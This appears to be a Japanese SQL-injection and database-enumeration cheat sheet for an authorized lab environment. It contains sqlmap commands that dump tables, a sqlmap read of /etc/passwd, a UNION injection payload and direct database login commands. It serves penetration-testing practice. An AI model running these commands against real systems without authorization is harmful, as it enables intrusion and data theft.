# DB / SQLi チートシート（あなたの環境版）

> 対象: 許可された演習環境 / 検証環境
> 主用途:
>
> * Web経由のSQLi確認
> * 直接DBサービスへの接続
> * DB種別判定
> * テーブル/カラム列挙
> * 認証後のread中心の情報取得
> * 証跡を `$OUT` / `$LOG` / Obsidian に残す

---

## 0. 開始フロー

```zsh
targettmux 10.10.10.10 dbtarget
scaninit
ports-serv
nextsvc
fullcheck
```

DB系サービスが見えたら、DB用の作業ディレクトリを切ります。

```zsh
mkdir -p "$OUT/db" "$OUT/sqlmap" "$LOG"
```

作業用変数:

```zsh
export URL=""
export PARAM=""
export DB_HOST="$TARGET_IP"
export DB_PORT=""
export DB_USER=""
export DB_PASS=""
export DB_NAME=""
export TABLE=""
export DB_FILE=""
```

---

## 1. DBがありそうかの初動確認

あなたの `nextsvc` / `log2obsidian` は、`mysql` `postgresql` `mongodb` などを open ポート行から拾って次アクションを出す作りです。なので、まず `nextsvc` を見て、その後でDBだけを狙った確認に入るのが自然です。  

```zsh
grep -Ei '3306|5432|1433|1521|27017|6379' "$OUT/nmap_service.nmap"
```

DB系だけ追加で見たい時:

```zsh
nmap -Pn -n -sC -sV -p 1433,1521,3306,5432,27017,6379 "$TARGET_IP" -oA "$OUT/nmap_db"
```

---

## 2. Web経由のSQLi確認（sqlmap優先）

元コマンド群では discovery / enumeration / dump の流れが SQLMap 中心でまとまっていたので、あなたの環境では **出力先を `$OUT/sqlmap` に寄せる** 形にするのが一番扱いやすいです。 

### 2-1. GETパラメータ

```zsh
export URL="http://$TARGET_IP/item.php?id=1"
export PARAM="id"

sqlmap -u "$URL" -p "$PARAM" \
  --batch --level=1 --risk=1 --threads=3 \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_probe.log"
```

DB一覧:

```zsh
sqlmap -u "$URL" -p "$PARAM" \
  --dbs --batch \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_dbs.log"
```

テーブル一覧:

```zsh
export DB_NAME="appdb"

sqlmap -u "$URL" -p "$PARAM" \
  --tables -D "$DB_NAME" --batch \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_tables_${DB_NAME}.log"
```

カラム一覧:

```zsh
export TABLE="users"

sqlmap -u "$URL" -p "$PARAM" \
  --columns -D "$DB_NAME" -T "$TABLE" --batch \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_columns_${DB_NAME}_${TABLE}.log"
```

dump:

```zsh
sqlmap -u "$URL" -p "$PARAM" \
  --dump -D "$DB_NAME" -T "$TABLE" --batch \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_dump_${DB_NAME}_${TABLE}.log"
```

### 2-2. POST / Cookie / raw request

```zsh
sqlmap -u "http://$TARGET_IP/login.php" \
  --data="username=test&password=test" \
  --cookie="PHPSESSID=xxxx" \
  -p username \
  --batch \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_post.log"
```

Burpで保存した raw request を使う時:

```zsh
sqlmap -r request.txt -p item \
  --batch \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_request.log"
```

ファイル読取確認:

```zsh
sqlmap -u "$URL" -p "$PARAM" \
  --file-read="/etc/passwd" \
  --batch \
  --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_fileread.log"
```

---

## 3. DB種別の即判別コマンド

元の貼り付けコマンド群には、各DBの version / current user / 権限確認が散っていたので、実戦で使う最低限だけ抜いています。 

### MySQL / MariaDB

```sql
SELECT VERSION();
SELECT current_user;
SHOW DATABASES;
```

### PostgreSQL

```sql
SELECT version();
SELECT current_user;
```

### MSSQL

```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure;
```

### Oracle

```sql
SELECT banner FROM v$version;
SELECT version FROM v$instance;
SELECT user FROM dual;
```

### SQLite

```sql
SELECT sqlite_version();
.version
```

### MongoDB

```javascript
db.version()
db.runCommand({connectionStatus: 1})
show dbs
```

---

## 4. 直接DB接続

元コマンド群の authentication 部分を、`$TARGET_IP` / `$DB_HOST` / `$DB_PORT` に寄せて整理しています。 

### MySQL / MariaDB

```zsh
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS"
mariadb -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS"
```

DB指定でワンライナー:

```zsh
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" \
  -e "SHOW TABLES;" | tee "$OUT/db/mysql_tables.txt"
```

### PostgreSQL

```zsh
psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME"
```

### MSSQL

```zsh
sqlcmd -S "$DB_HOST,$DB_PORT" -U "$DB_USER" -P "$DB_PASS"
impacket-mssqlclient "$DB_USER:$DB_PASS@$DB_HOST"
```

Windows認証/Kerberos系:

```zsh
impacket-mssqlclient "$DB_USER@$DB_HOST" -windows-auth -k
```

### Oracle

```zsh
sqlplus "$DB_USER/$DB_PASS@$DB_HOST:$DB_PORT/$DB_NAME"
```

### MongoDB

今は `mongo` より `mongosh` で揃える方が扱いやすいです。

```zsh
mongosh "mongodb://$DB_USER:$DB_PASS@$DB_HOST:$DB_PORT/$DB_NAME"
```

認証なし確認:

```zsh
mongosh --host "$DB_HOST" --port "$DB_PORT"
```

### SQLite

```zsh
sqlite3 "$DB_FILE"
```

---

## 5. 列挙

### MySQL / MariaDB

```sql
SHOW DATABASES;
USE appdb;
SHOW TABLES;
DESCRIBE users;

SELECT table_name
FROM information_schema.tables
WHERE table_schema = database();

SELECT column_name
FROM information_schema.columns
WHERE table_schema = database()
  AND table_name = 'users';
```

### PostgreSQL

```sql
\l
\c appdb
\dt
\d users

SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'public';

SELECT column_name
FROM information_schema.columns
WHERE table_name = 'users';
```

### MSSQL

```sql
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;

SELECT COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = 'users';
```

### Oracle

```sql
SELECT name FROM v$database;
SELECT table_name FROM user_tables;

SELECT table_name
FROM all_tables
WHERE owner = 'SCHEMA_NAME';

SELECT column_name
FROM all_tab_columns
WHERE table_name = 'USERS';
```

### SQLite

```sql
.tables
.schema users
PRAGMA table_info('users');
SELECT name FROM sqlite_master WHERE type='table';
```

### MongoDB

```javascript
show dbs
use appdb
show collections
db.users.findOne()
db.users.find()
```

元コマンド群には `information_schema`, `sys`, `all_tables`, `sqlite_master`, `show collections` などが含まれていたので、DBごとに分け直すとかなり見やすくなります。 

---

## 6. read中心のデータ取得

あなたの運用では、まず読み出し結果を `$OUT/db` に落とす形が合っています。ログは `tee "$LOG/..."`、成果物は `$OUT/db/...` に分けると後で Obsidian へ貼りやすいです。 `target` は `$OUT` と `$LOG` をターゲットごとに張る作りなので、この分け方と相性が良いです。  

### MySQL

```zsh
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" \
  -e "SELECT * FROM users LIMIT 5;" \
  | tee "$OUT/db/mysql_users_preview.txt"
```

```zsh
mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" \
  -e "SELECT email FROM users LIMIT 10;" \
  | tee "$OUT/db/mysql_emails.txt"
```

### PostgreSQL

```zsh
psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" \
  -c "SELECT * FROM users LIMIT 5;" \
  | tee "$OUT/db/pgsql_users_preview.txt"
```

### MSSQL

```zsh
sqlcmd -S "$DB_HOST,$DB_PORT" -d "$DB_NAME" \
  -U "$DB_USER" -P "$DB_PASS" \
  -Q "SELECT TOP 10 * FROM users" \
  -o "$OUT/db/mssql_users_preview.txt"
```

### SQLite

```zsh
sqlite3 "$DB_FILE" "SELECT * FROM users LIMIT 5;" \
  > "$OUT/db/sqlite_users_preview.txt"
```

### MongoDB

```javascript
db.users.find().limit(5)
```

---

## 7. SQLiの手動確認用メモ

元コマンド群には UNION ベースのテーブル列挙例も入っていました。SQLMap前提でも、手動確認の1本は持っておくと便利です。 

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = database();

SELECT column_name
FROM information_schema.columns
WHERE table_schema = database()
  AND table_name = 'users';
```

UNION確認メモ:

```sql
'-' UNION SELECT NULL, table_name, NULL
FROM information_schema.tables
WHERE table_schema = database() --
```

---

## 8. MSSQLの権限確認メモ

MSSQLだけは、権限次第で一気に広がるので、認証後はまずこれです。 

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure;
```

---

## 9. 高リスク操作の扱い

元のコマンド群には、`xp_cmdshell`、`OUTFILE`、`CREATE/DROP/ALTER`、更新系、OSコマンド実行系まで含まれていました。今回はあなたの普段の列挙フローに合わせて、**まず使う版**としては read中心に寄せています。 

切り分けとしてはこうです。

* **通常枠**: version / user / databases / tables / columns / preview dump
* **要権限確認**: `xp_cmdshell`, ストアドプロシージャ, 関数作成
* **別紙管理推奨**: 更新系、削除系、ファイル書込系、webshell系

少なくとも日常の初動チートシートには、`DROP DATABASE` や更新系は混ぜない方が見やすいです。

---

## 10. 記録の残し方

あなたの環境には `l2m` と `l2o` があり、`log2memo.sh` は最新ログを `~/Vault/Target/$TARGET_IP/攻略メモ.md` に追記する作りです。なので、DB作業は `tee "$LOG/..."` を徹底して、必要なタイミングで `l2m` を打つ運用が合います。  

例:

```zsh
sqlmap -u "$URL" -p "$PARAM" --dbs --batch --output-dir="$OUT/sqlmap" \
  | tee "$LOG/sqlmap_dbs.log"

l2m
```

証跡スクショは:

```zsh
fshot
```

---

## 11. まず使う最短フロー

```zsh
targettmux 10.10.10.10 dbtarget
scaninit
ports-serv
nextsvc
mkdir -p "$OUT/db" "$OUT/sqlmap" "$LOG"

# Web SQLi が見えるとき
export URL="http://$TARGET_IP/item.php?id=1"
export PARAM="id"
sqlmap -u "$URL" -p "$PARAM" --batch --level=1 --risk=1 --threads=3 \
  --output-dir="$OUT/sqlmap" | tee "$LOG/sqlmap_probe.log"
sqlmap -u "$URL" -p "$PARAM" --dbs --batch \
  --output-dir="$OUT/sqlmap" | tee "$LOG/sqlmap_dbs.log"

# MySQL が見えるとき
mysql -h "$TARGET_IP" -P 3306 -u "$DB_USER" -p"$DB_PASS" \
  -e "SHOW DATABASES;" | tee "$OUT/db/mysql_dbs.txt"

# PostgreSQL が見えるとき
psql -h "$TARGET_IP" -p 5432 -U "$DB_USER" -d "$DB_NAME"

# MSSQL が見えるとき
impacket-mssqlclient "$DB_USER:$DB_PASS@$TARGET_IP"

# MongoDB が見えるとき
mongosh --host "$TARGET_IP" --port 27017
```

---

## 12. ひとことで言うと

今回の適応ポイントはこの3つです。

* プレースホルダを **`$TARGET_IP` / `$OUT` / `$LOG` 中心**に統一
* 元の「discovery / enumeration / authentication / post-exploitation」を **あなたの実務順** に並べ替え
* 危険操作を通常枠から外し、**初動で本当に使う部分だけ前面**に出した
